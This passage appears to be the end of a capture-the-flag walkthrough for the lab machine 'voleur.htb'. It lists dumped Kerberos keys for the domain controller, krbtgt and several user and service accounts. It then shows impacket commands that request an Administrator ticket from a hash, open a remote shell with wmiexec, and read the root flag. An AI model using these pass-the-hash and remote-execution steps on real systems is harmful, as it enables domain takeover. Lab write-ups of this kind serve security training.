+DC$:aes256-cts-hmac-sha1-96:65d713fde9ec5e1b1fd9144ebddb43221123c44e00c9dacd8bfc2cc7b00908b7
+DC$:aes128-cts-hmac-sha1-96:fa76ee3b2757db16b99ffa087f451782
+DC$:des-cbc-md5:64e05b6d1abff1c8
+krbtgt:aes256-cts-hmac-sha1-96:2500eceb45dd5d23a2e98487ae528beb0b6f3712f243eeb0134e7d0b5b25b145
+krbtgt:aes128-cts-hmac-sha1-96:04e5e22b0af794abb2402c97d535c211
+krbtgt:des-cbc-md5:34ae31d073f86d20
+voleur.htb\ryan.naylor:aes256-cts-hmac-sha1-96:0923b1bd1e31a3e62bb3a55c74743ae76d27b296220b6899073cc457191fdc74
+voleur.htb\ryan.naylor:aes128-cts-hmac-sha1-96:6417577cdfc92003ade09833a87aa2d1
+voleur.htb\ryan.naylor:des-cbc-md5:4376f7917a197a5b
+voleur.htb\marie.bryant:aes256-cts-hmac-sha1-96:d8cb903cf9da9edd3f7b98cfcdb3d36fc3b5ad8f6f85ba816cc05e8b8795b15d
+voleur.htb\marie.bryant:aes128-cts-hmac-sha1-96:a65a1d9383e664e82f74835d5953410f
+voleur.htb\marie.bryant:des-cbc-md5:cdf1492604d3a220
+voleur.htb\lacey.miller:aes256-cts-hmac-sha1-96:1b71b8173a25092bcd772f41d3a87aec938b319d6168c60fd433be52ee1ad9e9
+voleur.htb\lacey.miller:aes128-cts-hmac-sha1-96:aa4ac73ae6f67d1ab538addadef53066
+voleur.htb\lacey.miller:des-cbc-md5:6eef922076ba7675
+voleur.htb\svc_ldap:aes256-cts-hmac-sha1-96:2f1281f5992200abb7adad44a91fa06e91185adda6d18bac73cbf0b8dfaa5910
+voleur.htb\svc_ldap:aes128-cts-hmac-sha1-96:7841f6f3e4fe9fdff6ba8c36e8edb69f
+voleur.htb\svc_ldap:des-cbc-md5:1ab0fbfeeaef5776
+voleur.htb\svc_backup:aes256-cts-hmac-sha1-96:c0e9b919f92f8d14a7948bf3054a7988d6d01324813a69181cc44bb5d409786f
+voleur.htb\svc_backup:aes128-cts-hmac-sha1-96:d6e19577c07b71eb8de65ec051cf4ddd
+voleur.htb\svc_backup:des-cbc-md5:7ab513f8ab7f765e
+voleur.htb\svc_iis:aes256-cts-hmac-sha1-96:77f1ce6c111fb2e712d814cdf8023f4e9c168841a706acacbaff4c4ecc772258
+voleur.htb\svc_iis:aes128-cts-hmac-sha1-96:265363402ca1d4c6bd230f67137c1395
+voleur.htb\svc_iis:des-cbc-md5:70ce25431c577f92
+voleur.htb\jeremy.combs:aes256-cts-hmac-sha1-96:8bbb5ef576ea115a5d36348f7aa1a5e4ea70f7e74cd77c07aee3e9760557baa0
+voleur.htb\jeremy.combs:aes128-cts-hmac-sha1-96:b70ef221c7ea1b59a4cfca2d857f8a27
+voleur.htb\jeremy.combs:des-cbc-md5:192f702abff75257
+voleur.htb\svc_winrm:aes256-cts-hmac-sha1-96:6285ca8b7770d08d625e437ee8a4e7ee6994eccc579276a24387470eaddce114
+voleur.htb\svc_winrm:aes128-cts-hmac-sha1-96:f21998eb094707a8a3bac122cb80b831
+voleur.htb\svc_winrm:des-cbc-md5:32b61fb92a7010ab
+[*] Cleaning up... 
+                              
+```
+
+```
+ impacket-getTGT -hashes :e656e07c56d831611b577b160b259ad2 voleur.htb/Administrator
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in Administrator.ccache
+                                                                                                                
+┌──(kali㉿kali)-[~/machines/voleur]
+└─$ export KRB5CCNAME=Administrator.ccache                                         
+                                                                                                                
+┌──(kali㉿kali)-[~/machines/voleur]
+└─$ klist
+Ticket cache: FILE:Administrator.ccache
+Default principal: Administrator@VOLEUR.HTB
+
+Valid starting       Expires              Service principal
+10/06/2026 15:46:17  10/07/2026 01:46:17  krbtgt/VOLEUR.HTB@VOLEUR.HTB
+        renew until 10/07/2026 15:46:17
+
+```
+
+### Root flag
+
+```
+impacket-wmiexec voleur.htb/Administrator@DC.voleur.htb -k -no-pass
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>whoami
+voleur\administrator
+
+C:\>cd c:\users\Administrator
+c:\users\Administrator>cd Desktop
+c:\users\Administrator\Desktop>dir
+ Volume in drive C has no label.
+ Volume Serial Number is A5C3-6454
+
+ Directory of c:\users\Administrator\Desktop
+
+06/05/2025  03:33 PM    <DIR>          .
+06/05/2025  03:30 PM    <DIR>          ..
+01/29/2025  02:12 AM             2,308 Microsoft Edge.lnk
+10/06/2026  10:01 AM                34 root.txt
+               2 File(s)          2,342 bytes
+               2 Dir(s)   4,025,692,160 bytes free
+
+c:\users\Administrator\Desktop>type root.txt
+381c0591a11a10fcd50baaed2d4a3eaf
+
+c:\users\Administrator\Desktop>
+
 ```
 
 ---
